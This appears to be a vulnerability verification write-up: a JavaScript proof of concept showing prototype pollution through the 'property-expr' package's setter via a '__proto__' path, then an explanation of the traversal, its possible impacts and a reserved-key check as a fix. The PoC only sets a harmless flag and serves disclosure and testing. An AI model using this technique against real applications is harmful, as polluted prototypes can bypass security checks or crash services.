const { setter } = require('property-expr');

async function exploit() {
  // 1. Create a path traversal targeting Object.prototype
  const setProp = setter('__proto__.exploited');

  // 2. Execute the generated setter on an empty object.
  // Internally, the setter splits the path into ['__proto__', 'exploited'].
  // When index = 0, it executes: data = {}['__proto__'] -> Object.prototype
  // The loop exits, and then executes: Object.prototype['exploited'] = 'true'
  setProp({}, 'true');

  // 3. Verify that the global prototype was mutated
  if ({}.exploited === 'true') {
    console.log('✓ VULNERABILITY CONFIRMED: Object.prototype has been polluted with "exploited" property.');
  } else {
    throw new Error('Prototype pollution failed. The package may be patched or running in a restricted environment.');
  }
}

await exploit();
```

### 🔍 Why This Demonstrates the Vulnerability

1. **Path Parsing & Traversal**: The `setter` function expects a dot-notation string (e.g., `"a.b.c"`) and splits it into an array of keys (`parts`). It then iteratively navigates through the provided `data` object using those keys: `data = data[parts[index++]]`.
2. **Bypassing Object Boundaries**: When the path contains `__proto__`, JS's property lookup naturally resolves it to the base prototype chain. In the PoC, starting with an empty `{}` and navigating `['__proto__', 'exploited']` causes:
   - `index = 0`: `data` becomes `{}`.constructor?.prototype which is **`Object.prototype`**.
   - The `while (index < len - 1)` loop terminates because `index` reaches `len - 1`.
   - `data[parts[index]] = value` executes as: `Object.prototype['exploited'] = 'true'`.
3. **Prototype Pollution Impact**: Because the assignment bypasses standard object boundaries and directly mutates `Object.prototype`, *every* newly created object (`{}` or `new Object()`) will inherit the `exploited` property. This can lead to:
   - Logic bypasses in security checks
   - Property overwrites causing Denial of Service (DoS)
   - Potential Remote Code Execution (RCE) if constructors or sensitive methods are overwritten
4. **Lack of Validation**: The vulnerable checkout provided lacks guards against reserved prototype keys (`__proto__`, `constructor`, `prototype`). A patched version would typically include a check like:
   ```js
   const RESERVED_KEYS = ['constructor', 'prototype', '__proto__'];
   if (RESERVED_KEYS.includes(parts[i])) {
     throw new Error('Invalid path: contains prototype key');
   }
   ```
   Without this sanitization, arbitrary traversal into the prototype chain remains possible, validating the vulnerability as described.

